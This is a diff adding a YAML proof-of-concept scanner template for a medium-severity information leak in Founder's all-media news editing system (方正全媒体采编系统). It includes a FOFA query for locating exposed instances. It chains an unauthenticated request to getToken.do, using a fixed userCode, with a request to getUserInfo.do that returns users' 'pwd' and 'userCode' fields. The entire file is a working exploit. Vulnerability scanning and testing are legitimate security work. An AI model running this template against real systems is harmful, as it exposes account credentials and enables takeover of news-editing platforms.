@@ -1,0 +1,27 @@
+id: poc-yaml-founder-getuserinfo-info-leak
+info:
+  name: 方正全媒体采编系统 getUserInfo 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 方正全媒体采编系统
+  fofa: app="FOUNDER-全媒体采编系统"
+requests:
+- method: GET
+  path: /newsedit/tokenHelp/getToken.do?userCode=a18f178d935d2284a771f6f5903d7160
+  expression: status_code == 200 && contains(body,"token")
+  output:
+  - regex_match(body,"\"token\":\"(?P<token>.*?)\",")
+- method: GET
+  path: /newsedit/tokenHelp/getUserInfo.do?token={{.token}}
+  expression: 'status_code == 200 &&
+
+    matches(body,`"pwd":".*?"`) &&
+
+    matches(body,`"userCode":".*?"`) &&
+
+    !contains(body,"<")
+
+    '
+variables: {}
+transport: http
